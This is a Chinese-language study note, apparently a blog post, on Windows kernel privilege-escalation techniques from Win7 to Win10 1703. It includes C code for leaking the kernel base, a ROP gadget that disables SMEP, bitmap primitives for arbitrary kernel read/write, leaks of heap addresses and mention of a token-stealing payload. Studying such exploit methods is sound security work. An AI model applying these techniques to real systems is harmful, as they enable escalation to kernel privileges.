## Win7 SP1 64bit

### Get Kernel Base

64bit中，SYSTEM_MODULE的前两个reserve大小变了，其他一致。

```c
#include <Windows.h>
#include <stdio.h>

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG64              Reserved1;                    // ULONG64 in 64bit windows
	ULONG64              Reserved2;                    // ULONG   in 32bit windows
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(NTAPI* PNtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

PVOID GetKernelBase()
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PVOID kernelBase = NULL;

	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBaseAddress;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return kernelBase;
}

int main()
{
	printf("Kernel base: %p.\n", GetKernelBase());
	return 0;
}
```

## Win8.1 64bit

### ROP 关闭 SMEP

```
kd> uf KiConfigureDynamicProcessor
nt!KiConfigureDynamicProcessor:

..... snip ......

nt!KiConfigureDynamicProcessor+0x40:
fffff803`265ff3cc 0f22e0          mov     cr4,rax    <---- gadget here

nt!KiConfigureDynamicProcessor+0x43:
fffff803`265ff3cf 4883c428        add     rsp,28h
fffff803`265ff3d3 c3              ret
kd> ? fffff803`265ff3cc-nt
Evaluate expression: 3711948 = 00000000`0038a3cc
```

这个gadget中`add rsp, 28h`移动rsp到一个位置，该处位置是`NtQueryIntervalProfile(0x1234, &interVal)`函数的第一个参数。

而这其中的rax，反汇编可知，使用的`NtQueryIntervalProfile(0x1234, &interVal)`函数的第二个参数。

### Bitmap 任意地址读写 

GdiSharedHandleTable泄露地址

```
_TEB + 0x60 ----> _PEB 
_PEB + 0xf8 ----> GdiSharedHandleTable
GdiSharedHandleTable + index*0x18 ---->  GDICELL64
```

 GDICELL64

```c
typedef struct{
    PVOID pKernelAddress;   // point to Bitmap
    USHORT wProcessID;
    USHORT wCount;
    USHORT wUpper;
    PVOID wType;
    PVOID64 pUserAddress;
} GDICELL64;
```

bitmap

```c
typedef struct{
 BASEOBJECT64 BaseObject; // 0x18bytes
 SURFOBJ64 SurfObj; 
 ....... 
} SURFACE64

typedef struct {
 ULONG64 hHmgr; // 8bytes
 ULONG32 ulShareCount; // 4bytes
 WORD cExclusiveLock; // 2bytes
 WORD BaseFlags; // 2bytes
 ULONG64 Tid; // 8bytes
} BASEOBJECT64;

typedef struct{
 ULONG64 dhsurf; // 8bytes
 ULONG64 hsurf; // 8bytes
 ULONG64 dhpdev; // 8bytes
 ULONG64 hdev; // 8bytes
 SIZEL sizlBitmap; // 8bytes
 ULONG64 cjBits; // 8bytes
 ULONG64 pvBits; // 8bytes
 ULONG64 pvScan0; // 8bytes
 ULONG32 lDelta; // 4bytes
 ULONG32 iUniq; // 4bytes
 ULONG32 iBitmapFormat; // 4bytes
 USHORT iType; // 2bytes
 USHORT fjBitmap; // 2bytes
} SURFOBJ64
```

pvScan0指向`Pixel Data`，这个结构就是CreateBitmap中的第五个参数。

![bitmap](https://raw.githubusercontent.com/clxsh/pics/master/img/bitmap.png)

通过下面两个函数修改pvScan0处的数据。

```c
LONG SetBitmapBits(
  HBITMAP    hbm,
  DWORD      cb,
  const VOID *pvBits
);

LONG GetBitmapBits(
  HBITMAP hbit,
  LONG    cb,
  LPVOID  lpvBits
);
```

所以使用两个Bitmap，第一个bitmap指向第二个bitmap的pvScan0处，第一个bitmap控制地址，第二个bitmap进行读写。

### 执行流的恢复

```
add rsp, 30h
mov [rsp], nt!KeQueryIntervalProfile+0x25
ret
```

## Win10 1607 64bit

利用`user32.dll`中的`gSharedInfo`的`aheList`，配合堆喷射获得Bitmap地址。

```c
typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, * PSHAREDINFO;

typedef struct _USER_HANDLE_ENTRY {
	void* pKernel;
	union
	{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;
```

`CreateAcceleratorTable`创建的加速表会存放在`aheList`中，通过index索引取得`pKernel`的值。

## Win10 1703 64bit

利用 desktop heap 泄露bitmap地址

用户空间和内核空间同时映射有`tagWND`，`tagWND`呢里面有一个`tagCLS`结构，`tagCLS`里面有一个`lpszMenuName`成员，该成员所使用的空间与bitmap分配处于同一个堆中。利用这个结构造成bitmap地址的可预测。

因为内核空间不可读，无法直接读取 `lpszMenuName` 的地址。但 desktop heap 的内核空间与用户空间与固定偏移，可以算出 `lpszMenuName` **变量**在用户空间的位置，进而读出 `lpszMenuName` 的**值**。

![RS2-Desktop5](https://raw.githubusercontent.com/clxsh/pics/master/img/RS2-Desktop5.jpg)

## Win10 1709 64bit

暂且搁置，先尽可能多的学习漏洞的类型。

## Q&A

1. 加载模块符号文件

   ```
   kd > ld module_name        // 比reload快
   ```

   

## ERROR

### 1. `No code found, aborting`

又遇到了`No code found, aborting`问题，进程空间相关的问题好像

```
uf NtQueryIntervalProfile
```

## 2. C++ 项目中汇编写的函数，拷贝指令字节码，会拷贝成相对跳转指令

C++ 中对汇编函数的调用，是通过 `jmp` 过去的

```
extern "C" VOID StealToken(VOID);

CopyMemory((PVOID)0x100200, StealToken, 0x200);
```

被迫改用字节码，痛苦van分

## 参考

1. [www漏洞从win7-win10 ThunderJ](https://thunderjie.github.io/2019/08/19/www%E6%BC%8F%E6%B4%9E%E4%BB%8Ewin7-win10/) 
2. [Part 18: Kernel Exploitation -> RS2 Bitmap Necromancy](http://fuzzysecurity.com/tutorials/expDev/22.html)

